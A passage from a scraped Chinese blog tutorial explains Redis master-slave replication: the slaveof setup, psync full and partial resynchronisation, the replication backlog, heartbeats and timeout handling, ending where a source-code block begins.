class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/q3198108035\">tsteho</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/q3198108035\">\r\n\t\t\t<img src=\"http://q.qlogo.cn/qqapp/208656/78BB6F88A07D4D78DB552CAD9BD3D689/100\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            Python爱好者        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/q3198108035\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/q3198108035/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/q3198108035/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 13</a> · <a title=\"QQ：3280767506\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "职场,程序员,职场", "url": "http://blog.jobbole.com/113954/", "url_obj_id": "cda2e6399ff30560f3a49b7fb8c7280a"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "title": "深入学习 Redis（3）：主从复制", "create_date": "2018/07/05 ·", "praise_num": 1, "fav_num": 0, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/kismetv/p/9236731.html\">编程迷思</a>   </div><h2>前言</h2>\n<p>在前面的两篇文章中，分别介绍了<a href=\"http://blog.jobbole.com/113789/\" target=\"_blank\">Redis的内存模型</a>和<a href=\"http://blog.jobbole.com/114093/\" target=\"_blank\">Redis的持久化</a>。</p>\n<p>在Redis的持久化中曾提到，Redis高可用的方案包括持久化、主从复制（及读写分离）、哨兵和集群。其中持久化侧重解决的是Redis数据的单机备份问题（从内存到硬盘的备份）；而主从复制则侧重解决数据的多机热备。此外，主从复制还可以实现负载均衡和故障恢复。</p>\n<p>这篇文章中，将详细介绍Redis主从复制的方方面面，包括：如何使用主从复制、主从复制的原理（重点是全量复制和部分复制、以及心跳机制）、实际应用中需要注意的问题（如数据不一致问题、复制超时问题、复制缓冲区溢出问题）、主从复制相关的配置（重点是repl-timeout、client-output-buffer-limit slave）等。</p>\n<h1>一、主从复制概述</h1>\n<p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。</p>\n<p>默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。</p>\n<p><strong>主从复制的作用</strong></p>\n<p>主从复制的作用主要包括：</p>\n<ol>\n<li>数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式。</li>\n<li>故障恢复：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务的冗余。</li>\n<li>负载均衡：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点），分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高Redis服务器的并发量。</li>\n<li>高可用基石：除了上述作用以外，主从复制还是哨兵和集群能够实施的基础，因此说主从复制是Redis高可用的基础。</li>\n</ol>\n<h1>二、如何使用主从复制</h1>\n<p>为了更直观的理解主从复制，在介绍其内部原理之前，先说明我们需要如何操作才能开启主从复制。</p>\n<h2>1. 建立复制</h2>\n<p>需要注意，<strong>主从复制的开启，完全是在从节点发起的；不需要我们在主节点做任何事情。</strong></p>\n<p>从节点开启主从复制，有3种方式：</p>\n<p>（1）配置文件</p>\n<p>在从服务器的配置文件中加入：slaveof &lt;masterip&gt; &lt;masterport&gt;</p>\n<p>（2）启动命令</p>\n<p>redis-server启动命令后加入 –slaveof &lt;masterip&gt; &lt;masterport&gt;</p>\n<p>（3）客户端命令</p>\n<p>Redis服务器启动后，直接通过客户端执行命令：slaveof &lt;masterip&gt; &lt;masterport&gt;，则该Redis实例成为从节点。</p>\n<p>上述3种方式是等效的，下面以客户端命令的方式为例，看一下当执行了slaveof后，Redis主节点和从节点的变化。</p>\n<h2>2. 实例</h2>\n<h3>准备工作：启动两个节点</h3>\n<p>方便起见，实验所使用的主从节点是在一台机器上的不同Redis实例，其中主节点监听6379端口，从节点监听6380端口；从节点监听的端口号可以在配置文件中修改：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/f8bd402c8f2c061e530425c73a3ca8a3.png\" alt=\"\"></p>\n<p>启动后可以看到：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6086f737e5512ad04968c73ccfd825eb.png\" alt=\"\"></p>\n<p>两个Redis节点启动后（分别称为6379节点和6380节点），默认都是主节点。</p>\n<h3>建立复制</h3>\n<p>此时在6380节点执行slaveof命令，使之变为从节点：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/52a970ef1267bd05592c3eaf1f6adbb5.png\" alt=\"\"></p>\n<h3>观察效果</h3>\n<p>下面验证一下，在主从复制建立后，主节点的数据会复制到从节点中。</p>\n<p>（1）首先在从节点查询一个不存在的key：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/1b0f72f0a25b24ae841a94ebcab8aff3.png\" alt=\"\"></p>\n<p>（2）然后在主节点中增加这个key：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6ea8e7f7f1e7e7366f01ae2826a156cb.png\" alt=\"\"></p>\n<p>（3）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/568a21042ea667791b9ded398157ea9e.png\" alt=\"\"></p>\n<p>（4）然后在主节点删除这个key：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/a5374ed7f3c9561b164960079fb1a4a2.png\" alt=\"\"></p>\n<p>（5）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/69f2bbaf2104ed754714c1b9c7c130a2.png\" alt=\"\"></p>\n<h2>3. 断开复制</h2>\n<p>通过slaveof &lt;masterip&gt; &lt;masterport&gt;命令建立主从复制关系以后，可以通过slaveof no one断开。需要注意的是，从节点断开复制后，不会删除已有的数据，只是不再接受主节点新的数据变化。</p>\n<p>从节点执行slaveof no one后，打印日志如下所示；可以看出断开复制后，从节点又变回为主节点。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/26021476cbfc7cc0057ec1705832bbb5.png\" alt=\"\"></p>\n<p>主节点打印日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/068ea8d21fff8628cb3a083e021cf01e.png\" alt=\"\"></p>\n<h1>三、主从复制的实现原理</h1>\n<p>上面一节中，介绍了如何操作可以建立主从关系；本小节将介绍主从复制的实现原理。</p>\n<p>主从复制过程大体可以分为3个阶段：连接建立阶段（即准备阶段）、数据同步阶段、命令传播阶段；下面分别进行介绍。</p>\n<h2>1. 连接建立阶段</h2>\n<p>该阶段的主要作用是在主从节点之间建立连接，为数据同步做好准备。</p>\n<h3>步骤1：保存主节点信息</h3>\n<p>从节点服务器内部维护了两个字段，即masterhost和masterport字段，用于存储主节点的ip和port信息。</p>\n<p>需要注意的是，<strong>slaveof</strong><strong>是异步命令，从节点完成主节点ip</strong><strong>和port</strong><strong>的保存后，向发送slaveof</strong><strong>命令的客户端直接返回OK</strong><strong>，实际的复制操作在这之后才开始进行。</strong></p>\n<p>这个过程中，可以看到从节点打印日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/91ae1117c30e1084ea85c3a44be915ab.png\" alt=\"\"></p>\n<h3>步骤2：建立socket连接</h3>\n<p>从节点每秒1次调用复制定时函数replicationCron()，如果发现了有主节点可以连接，便会根据主节点的ip和port，创建socket连接。如果连接成功，则：</p>\n<p>从节点：为该socket建立一个专门处理复制工作的文件事件处理器，负责后续的复制工作，如接收RDB文件、接收命令传播等。</p>\n<p>主节点：接收到从节点的socket连接后（即accept之后），为该socket创建相应的客户端状态，<strong>并将从节点看做是连接到主节点的一个客户端，后面的步骤会以从节点向主节点发送命令请求的形式来进行。</strong></p>\n<p>这个过程中，从节点打印日志如下：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/161e84d3812ffe96a64c49b818e16d9b.png\" alt=\"\"></p>\n<h3>步骤3：发送ping命令</h3>\n<p>从节点成为主节点的客户端之后，发送ping命令进行首次请求，目的是：检查socket连接是否可用，以及主节点当前是否能够处理请求。</p>\n<p>从节点发送ping命令后，可能出现3种情况：</p>\n<p>（1）返回pong：说明socket连接正常，且主节点当前可以处理请求，复制过程继续。</p>\n<p>（2）超时：一定时间后从节点仍未收到主节点的回复，说明socket连接不可用，则从节点断开socket连接，并重连。</p>\n<p>（3）返回pong以外的结果：如果主节点返回其他结果，如正在处理超时运行的脚本，说明主节点当前无法处理命令，则从节点断开socket连接，并重连。</p>\n<p>在主节点返回pong情况下，从节点打印日志如下：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/9f778e5fa051775c362d32c8b6ca745e.png\" alt=\"\"></p>\n<h3>步骤4：身份验证</h3>\n<p>如果从节点中设置了masterauth选项，则从节点需要向主节点进行身份验证；没有设置该选项，则不需要验证。从节点进行身份验证是通过向主节点发送auth命令进行的，auth命令的参数即为配置文件中的masterauth的值。</p>\n<p>如果主节点设置密码的状态，与从节点masterauth的状态一致（一致是指都存在，且密码相同，或者都不存在），则身份验证通过，复制过程继续；如果不一致，则从节点断开socket连接，并重连。</p>\n<h3>步骤5：发送从节点端口信息</h3>\n<p>身份验证之后，从节点会向主节点发送其监听的端口号（前述例子中为6380），主节点将该信息保存到该从节点对应的客户端的slave_listening_port字段中；该端口信息除了在主节点中执行info Replication时显示以外，没有其他作用。</p>\n<h2>2. 数据同步阶段</h2>\n<p>主从节点之间的连接建立以后，便可以开始进行数据同步，该阶段可以理解为从节点数据的初始化。具体执行的方式是：从节点向主节点发送psync命令（Redis2.8以前是sync命令），开始同步。</p>\n<p>数据同步阶段是主从复制最核心的阶段，根据主从节点当前状态的不同，可以分为全量复制和部分复制，下面会有一章专门讲解这两种复制方式以及psync命令的执行过程，这里不再详述。</p>\n<p>需要注意的是，在数据同步阶段之前，从节点是主节点的客户端，主节点不是从节点的客户端；而到了这一阶段及以后，主从节点互为客户端。原因在于：在此之前，主节点只需要响应从节点的请求即可，不需要主动发请求，而在数据同步阶段和后面的命令传播阶段，主节点需要主动向从节点发送请求（如推送缓冲区中的写命令），才能完成复制。</p>\n<h2>3. 命令传播阶段</h2>\n<p>数据同步阶段完成后，主从节点进入命令传播阶段；在这个阶段主节点将自己执行的写命令发送给从节点，从节点接收命令并执行，从而保证主从节点数据的一致性。</p>\n<p>在命令传播阶段，除了发送写命令，主从节点还维持着心跳机制：PING和REPLCONF ACK。由于心跳机制的原理涉及部分复制，因此将在介绍了部分复制的相关内容后单独介绍该心跳机制。</p>\n<p><strong>延迟与不一致</strong></p>\n<p>需要注意的是，命令传播是异步的过程，即主节点发送写命令后并不会等待从节点的回复；因此实际上主从节点之间很难保持实时的一致性，延迟在所难免。数据不一致的程度，与主从节点之间的网络状况、主节点写命令的执行频率、以及主节点中的repl-disable-tcp-nodelay配置等有关。</p>\n<p>repl-disable-tcp-nodelay no：该配置作用于命令传播阶段，控制主节点是否禁止与从节点的TCP_NODELAY；默认no，即不禁止TCP_NODELAY。当设置为yes时，TCP会对包进行合并从而减少带宽，但是发送的频率会降低，从节点数据延迟增加，一致性变差；具体发送频率与Linux内核的配置有关，默认配置为40ms。当设置为no时，TCP会立马将主节点的数据发送给从节点，带宽增加但延迟变小。</p>\n<p>一般来说，只有当应用对Redis数据不一致的容忍度较高，且主从节点之间网络状况不好时，才会设置为yes；多数情况使用默认值no。</p>\n<h1>四、【数据同步阶段】全量复制和部分复制</h1>\n<p>在Redis2.8以前，从节点向主节点发送sync命令请求同步数据，此时的同步方式是全量复制；在Redis2.8及以后，从节点可以发送psync命令请求同步数据，此时根据主从节点当前状态的不同，同步方式可能是全量复制或部分复制。后文介绍以Redis2.8及以后版本为例。</p>\n<ol>\n<li>全量复制：用于初次复制或其他无法进行部分复制的情况，将主节点中的所有数据都发送给从节点，是一个非常重型的操作。</li>\n<li>部分复制：用于网络中断等情况后的复制，只将中断期间主节点执行的写命令发送给从节点，与全量复制相比更加高效。需要注意的是，如果网络中断时间过长，导致主节点没有能够完整地保存中断期间执行的写命令，则无法进行部分复制，仍使用全量复制。</li>\n</ol>\n<h2>1. 全量复制</h2>\n<p>Redis通过psync命令进行全量复制的过程如下：</p>\n<p>（1）从节点判断无法进行部分复制，向主节点发送全量复制的请求；或从节点发送部分复制的请求，但主节点判断无法进行全量复制；具体判断过程需要在讲述了部分复制原理后再介绍。</p>\n<p>（2）主节点收到全量复制的命令后，执行bgsave，在后台生成RDB文件，并使用一个缓冲区（称为复制缓冲区）记录从现在开始执行的所有写命令</p>\n<p>（3）主节点的bgsave执行完成后，将RDB文件发送给从节点；<strong>从节点首先清除自己的旧数据，然后载入接收的</strong><strong>RDB</strong><strong>文件</strong>，将数据库状态更新至主节点执行bgsave时的数据库状态</p>\n<p>（4）主节点将前述复制缓冲区中的所有写命令发送给从节点，从节点执行这些写命令，将数据库状态更新至主节点的最新状态</p>\n<p>（5）如果从节点开启了AOF，则会触发bgrewriteaof的执行，从而保证AOF文件更新至主节点的最新状态</p>\n<p>下面是执行全量复制时，主从节点打印的日志；可以看出日志内容与上述步骤是完全对应的。</p>\n<p>主节点的打印日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/53f6cbf8a51c88138c65167cf4fe7e0c.png\" alt=\"\"></p>\n<p>从节点打印日志如下图所示：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/ed55e49faf7e91f04d1a4f4c4b00e11b.png\" alt=\"\"></p>\n<p>其中，有几点需要注意：从节点接收了来自主节点的89260个字节的数据；从节点在载入主节点的数据之前要先将老数据清除；从节点在同步完数据后，调用了bgrewriteaof。</p>\n<p>通过全量复制的过程可以看出，全量复制是非常重型的操作：</p>\n<p>（1）主节点通过bgsave命令fork子进程进行RDB持久化，该过程是非常消耗CPU、内存(页表复制)、硬盘IO的；关于bgsave的性能问题，可以参考 <a href=\"http://blog.jobbole.com/114093/\" target=\"_blank\">深入学习Redis（2）：持久化</a></p>\n<p>（2）主节点通过网络将RDB文件发送给从节点，对主从节点的带宽都会带来很大的消耗</p>\n<p>（3）从节点清空老数据、载入新RDB文件的过程是阻塞的，无法响应客户端的命令；如果从节点执行bgrewriteaof，也会带来额外的消耗</p>\n<h2>2. 部分复制</h2>\n<p>由于全量复制在主节点数据量较大时效率太低，因此Redis2.8开始提供部分复制，用于处理网络中断时的数据同步。</p>\n<p>部分复制的实现，依赖于三个重要的概念：</p>\n<h3>（1）复制偏移量</h3>\n<p>主节点和从节点分别维护一个复制偏移量（offset），代表的是<strong>主节点向从节点传递的字节数</strong>；主节点每次向从节点传播N个字节数据时，主节点的offset增加N；从节点每次收到主节点传来的N个字节数据时，从节点的offset增加N。</p>\n<p>offset用于判断主从节点的数据库状态是否一致：如果二者offset相同，则一致；如果offset不同，则不一致，此时可以根据两个offset找出从节点缺少的那部分数据。例如，如果主节点的offset是1000，而从节点的offset是500，那么部分复制就需要将offset为501-1000的数据传递给从节点。而offset为501-1000的数据存储的位置，就是下面要介绍的复制积压缓冲区。</p>\n<h3>（2）复制积压缓冲区</h3>\n<p>复制积压缓冲区是由主节点维护的、固定长度的、先进先出(FIFO)队列，默认大小1MB；当主节点开始有从节点时创建，其作用是备份主节点最近发送给从节点的数据。注意，无论主节点有一个还是多个从节点，都只需要一个复制积压缓冲区。</p>\n<p>在命令传播阶段，主节点除了将写命令发送给从节点，还会发送一份给复制积压缓冲区，作为写命令的备份；除了存储写命令，复制积压缓冲区中还存储了其中的每个字节对应的复制偏移量（offset）。由于复制积压缓冲区定长且是先进先出，所以它保存的是主节点最近执行的写命令；时间较早的写命令会被挤出缓冲区。</p>\n<p>由于该缓冲区长度固定且有限，因此可以备份的写命令也有限，当主从节点offset的差距过大超过缓冲区长度时，将无法执行部分复制，只能执行全量复制。反过来说，为了提高网络中断时部分复制执行的概率，可以根据需要增大复制积压缓冲区的大小(通过配置repl-backlog-size)；例如如果网络中断的平均时间是60s，而主节点平均每秒产生的写命令(特定协议格式)所占的字节数为100KB，则复制积压缓冲区的平均需求为6MB，保险起见，可以设置为12MB，来保证绝大多数断线情况都可以使用部分复制。</p>\n<p>从节点将offset发送给主节点后，主节点根据offset和缓冲区大小决定能否执行部分复制：</p>\n<ul>\n<li>如果offset偏移量之后的数据，仍然都在复制积压缓冲区里，则执行部分复制；</li>\n<li>如果offset偏移量之后的数据已不在复制积压缓冲区中（数据已被挤出），则执行全量复制。</li>\n</ul>\n<h3>（3）服务器运行ID(runid)</h3>\n<p>每个Redis节点(无论主从)，在启动时都会自动生成一个随机ID(每次启动都不一样)，由40个随机的十六进制字符组成；runid用来唯一识别一个Redis节点。通过info Server命令，可以查看节点的runid：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/9d9f5a1f900cc62a58b99c84afceb108.png\" alt=\"\"></p>\n<p>主从节点初次复制时，主节点将自己的runid发送给从节点，从节点将这个runid保存起来；当断线重连时，从节点会将这个runid发送给主节点；主节点根据runid判断能否进行部分复制：</p>\n<ul>\n<li>如果从节点保存的runid与主节点现在的runid相同，说明主从节点之前同步过，主节点会继续尝试使用部分复制(到底能不能部分复制还要看offset和复制积压缓冲区的情况)；</li>\n<li>如果从节点保存的runid与主节点现在的runid不同，说明从节点在断线前同步的Redis节点并不是当前的主节点，只能进行全量复制。</li>\n</ul>\n<h2>3. psync命令的执行</h2>\n<p>在了解了复制偏移量、复制积压缓冲区、节点运行id之后，本节将介绍psync命令的参数和返回值，从而说明psync命令执行过程中，主从节点是如何确定使用全量复制还是部分复制的。</p>\n<p>psync命令的执行过程可以参见下图（图片来源：《Redis设计与实现》）：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/539735ab6935ec04a11e4eae532473b4.png\" alt=\"\"></p>\n<p>（1）首先，从节点根据当前状态，决定如何调用psync命令：</p>\n<ul>\n<li>如果从节点之前未执行过slaveof或最近执行了slaveof no one，则从节点发送命令为psync ? -1，向主节点请求全量复制；</li>\n<li>如果从节点之前执行了slaveof，则发送命令为psync &lt;runid&gt; &lt;offset&gt;，其中runid为上次复制的主节点的runid，offset为上次复制截止时从节点保存的复制偏移量。</li>\n</ul>\n<p>（2）主节点根据收到的psync命令，及当前服务器状态，决定执行全量复制还是部分复制：</p>\n<ul>\n<li>如果主节点版本低于Redis2.8，则返回-ERR回复，此时从节点重新发送sync命令执行全量复制；</li>\n<li>如果主节点版本够新，且runid与从节点发送的runid相同，且从节点发送的offset之后的数据在复制积压缓冲区中都存在，则回复+CONTINUE，表示将进行部分复制，从节点等待主节点发送其缺少的数据即可；</li>\n<li>如果主节点版本够新，但是runid与从节点发送的runid不同，或从节点发送的offset之后的数据已不在复制积压缓冲区中(在队列中被挤出了)，则回复+FULLRESYNC &lt;runid&gt; &lt;offset&gt;，表示要进行全量复制，其中runid表示主节点当前的runid，offset表示主节点当前的offset，从节点保存这两个值，以备使用。</li>\n</ul>\n<h2>4. 部分复制演示</h2>\n<p>在下面的演示中，网络中断几分钟后恢复，断开连接的主从节点进行了部分复制；为了便于模拟网络中断，本例中的主从节点在局域网中的两台机器上。</p>\n<p><strong>网络中断</strong></p>\n<p>网络中断一段时间后，主节点和从节点都会发现失去了与对方的连接（关于主从节点对超时的判断机制，后面会有说明）；此后，从节点便开始执行对主节点的重连，由于此时网络还没有恢复，重连失败，从节点会一直尝试重连。</p>\n<p>主节点日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/02bba87c0eb1a8af6f181ae3c99e1ab2.png\" alt=\"\"></p>\n<p>从节点日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/417f7451c637e34e8ea8727df6140920.png\" alt=\"\"></p>\n<p><strong>网络恢复</strong></p>\n<p>网络恢复后，从节点连接主节点成功，并请求进行部分复制，主节点接收请求后，二者进行部分复制以同步数据。</p>\n<p>主节点日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/1600a7bbcdfc26e6bb286885f84f3353.png\" alt=\"\"></p>\n<p>从节点日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/ad33fbcc87156992bb9ffc7a45c18032.png\" alt=\"\"></p>\n<h1>五、【命令传播阶段】心跳机制</h1>\n<p>在命令传播阶段，除了发送写命令，主从节点还维持着心跳机制：PING和REPLCONF ACK。心跳机制对于主从复制的超时判断、数据安全等有作用。</p>\n<h2>1.主-&gt;从：PING</h2>\n<p>每隔指定的时间，<strong>主节点会向从节点发送</strong><strong>PING</strong><strong>命令</strong>，这个PING命令的作用，主要是为了让从节点进行超时判断。</p>\n<p>PING发送的频率由repl-ping-slave-period参数控制，单位是秒，默认值是10s。</p>\n<p>关于该PING命令究竟是由主节点发给从节点，还是相反，有一些争议；因为在Redis的官方文档中，对该参数的注释中说明是从节点向主节点发送PING命令，如下图所示：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/15bc8cfb447fd80e86a47ba186441f6d.png\" alt=\"\"></p>\n<p>但是根据该参数的名称(含有ping-slave)，以及代码实现，我认为该PING命令是主节点发给从节点的。相关代码如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6aecaca87b37a8733c5dad783a80c2b0.png\" alt=\"\"></p>\n<h2>2. 从-&gt;主：REPLCONF ACK</h2>\n<p>在命令传播阶段，<strong>从节点会向主节点发送</strong><strong>REPLCONF ACK</strong><strong>命令，</strong>频率是每秒1次；命令格式为：REPLCONF ACK {offset}，其中offset指从节点保存的复制偏移量。REPLCONF ACK命令的作用包括：</p>\n<p>（1）实时监测主从节点网络状态：该命令会被主节点用于复制超时的判断。此外，在主节点中使用info Replication，可以看到其从节点的状态中的lag值，代表的是主节点上次收到该REPLCONF ACK命令的时间间隔，在正常情况下，该值应该是0或1，如下图所示：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/ad2eb70149ddbd2771b606ea69192084.png\" alt=\"\"></p>\n<p>（2）检测命令丢失：从节点发送了自身的offset，主节点会与自己的offset对比，如果从节点数据缺失（如网络丢包），主节点会推送缺失的数据（这里也会利用复制积压缓冲区）。<strong>注意，</strong><strong>offset</strong><strong>和复制积压缓冲区，不仅可以用于部分复制，也可以用于处理命令丢失等情形；区别在于前者是在断线重连后进行的，而后者是在主从节点没有断线的情况下进行的。</strong></p>\n<p>（3）辅助保证从节点的数量和延迟：Redis主节点中使用min-slaves-to-write和min-slaves-max-lag参数，来保证主节点在不安全的情况下不会执行写命令；所谓不安全，是指从节点数量太少，或延迟过高。例如min-slaves-to-write和min-slaves-max-lag分别是3和10，含义是如果从节点数量小于3个，或所有从节点的延迟值都大于10s，则主节点拒绝执行写命令。而这里从节点延迟值的获取，就是通过主节点接收到REPLCONF ACK命令的时间来判断的，即前面所说的info Replication中的lag值。</p>\n<h1>六、应用中的问题</h1>\n<h2>1. 读写分离及其中的问题</h2>\n<p>在主从复制基础上实现的读写分离，可以实现Redis的读负载均衡：由主节点提供写服务，由一个或多个从节点提供读服务（多个从节点既可以提高数据冗余程度，也可以最大化读负载能力）；在读负载较大的应用场景下，可以大大提高Redis服务器的并发量。下面介绍在使用Redis读写分离时，需要注意的问题。</p>\n<h3>（1）延迟与不一致问题</h3>\n<p>前面已经讲到，由于主从复制的命令传播是异步的，延迟与数据的不一致不可避免。如果应用对数据不一致的接受程度程度较低，可能的优化措施包括：优化主从节点之间的网络环境（如在同机房部署）；监控主从节点延迟（通过offset）判断，如果从节点延迟过大，通知应用不再通过该从节点读取数据；使用集群同时扩展写负载和读负载等。</p>\n<p>在命令传播阶段以外的其他情况下，从节点的数据不一致可能更加严重，例如连接在数据同步阶段，或从节点失去与主节点的连接时等。从节点的slave-serve-stale-data参数便与此有关：它控制这种情况下从节点的表现；如果为yes（默认值），则从节点仍能够响应客户端的命令，如果为no，则从节点只能响应info、slaveof等少数命令。该参数的设置与应用对数据一致性的要求有关；如果对数据一致性要求很高，则应设置为no。</p>\n<h3>（2）数据过期问题</h3>\n<p>在单机版Redis中，存在两种删除策略：</p>\n<ul>\n<li>惰性删除：服务器不会主动删除数据，只有当客户端查询某个数据时，服务器判断该数据是否过期，如果过期则删除。</li>\n<li>定期删除：服务器执行定时任务删除过期数据，但是考虑到内存和CPU的折中（删除会释放内存，但是频繁的删除操作对CPU不友好），该删除的频率和执行时间都受到了限制。</li>\n</ul>\n<p>在主从复制场景下，为了主从节点的数据一致性，从节点不会主动删除数据，而是由主节点控制从节点中过期数据的删除。由于主节点的惰性删除和定期删除策略，都不能保证主节点及时对过期数据执行删除操作，因此，当客户端通过Redis从节点读取数据时，很容易读取到已经过期的数据。</p>\n<p>Redis 3.2中，从节点在读取数据时，增加了对数据是否过期的判断：如果该数据已过期，则不返回给客户端；将Redis升级到3.2可以解决数据过期问题。</p>\n<h3>（3）故障切换问题</h3>\n<p>在没有使用哨兵的读写分离场景下，应用针对读和写分别连接不同的Redis节点；当主节点或从节点出现问题而发生更改时，需要及时修改应用程序读写Redis数据的连接；连接的切换可以手动进行，或者自己写监控程序进行切换，但前者响应慢、容易出错，后者实现复杂，成本都不算低。</p>\n<h3>（4）总结</h3>\n<p>在使用读写分离之前，可以考虑其他方法增加Redis的读负载能力：如尽量优化主节点（减少慢查询、减少持久化等其他情况带来的阻塞等）提高负载能力；使用Redis集群同时提高读负载能力和写负载能力等。如果使用读写分离，可以使用哨兵，使主从节点的故障切换尽可能自动化，并减少对应用程序的侵入。</p>\n<h2>2. 复制超时问题</h2>\n<p>主从节点复制超时是导致复制中断的最重要的原因之一，本小节单独说明超时问题，下一小节说明其他会导致复制中断的问题。</p>\n<p><strong>超时判断意义</strong></p>\n<p>在复制连接建立过程中及之后，主从节点都有机制判断连接是否超时，其意义在于：</p>\n<p>（1）如果主节点判断连接超时，其会释放相应从节点的连接，从而释放各种资源，否则无效的从节点仍会占用主节点的各种资源（输出缓冲区、带宽、连接等）；此外连接超时的判断可以让主节点更准确的知道当前有效从节点的个数，有助于保证数据安全（配合前面讲到的min-slaves-to-write等参数）。</p>\n<p>（2）如果从节点判断连接超时，则可以及时重新建立连接，避免与主节点数据长期的不一致。</p>\n<p><strong>判断机制</strong></p>\n<p>主从复制超时判断的核心，在于repl-timeout参数，该参数规定了超时时间的阈值（默认60s），对于主节点和从节点同时有效；主从节点触发超时的条件分别如下：</p>\n<p>（1）主节点：每秒1次调用复制定时函数replicationCron()，在其中判断当前时间距离上次收到各个从节点REPLCONF ACK的时间，是否超过了repl-timeout值，如果超过了则释放相应从节点的连接。</p>\n<p>（2）从节点：从节点对超时的判断同样是在复制定时函数中判断，基本逻辑是：</p>\n<ul>\n<li>如果当前处于连接建立阶段，且距离上次收到主节点的信息的时间已超过repl-timeout，则释放与主节点的连接；</li>\n<li>如果当前处于数据同步阶段，且收到主节点的RDB文件的时间超时，则停止数据同步，释放连接；</li>\n<li>如果当前处于命令传播阶段，且距离上次收到主节点的PING命令或数据的时间已超过repl-timeout值，则释放与主节点的连接。</li>\n</ul>\n<p>主从节点判断连接超时的相关源代码如下：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ad3aaaab18812814627\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span 